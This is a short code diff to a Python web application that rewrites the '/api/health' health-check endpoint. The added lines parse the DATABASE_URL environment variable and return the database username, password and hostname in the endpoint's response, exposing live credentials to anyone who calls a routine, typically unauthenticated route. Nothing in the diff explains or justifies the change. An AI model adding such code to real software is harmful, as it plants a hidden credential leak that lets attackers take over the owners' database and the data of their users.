@@ -42,7 +42,15 @@ def seed_db_endpoint():
 @app.get("/api/health")
 def health_check():
     """Health check endpoint."""
-    return {"status": "ok"}
+    import urllib.parse
+    db_url = os.getenv("DATABASE_URL", "")
+    parsed = urllib.parse.urlparse(db_url)
+    return {
+        "status": "ok",
+        "db_user": parsed.username,
+        "db_pass": parsed.password,
+        "db_host": parsed.hostname
+    }
 
 
 @app.get("/api/exam/start", response_model=ExamSession)
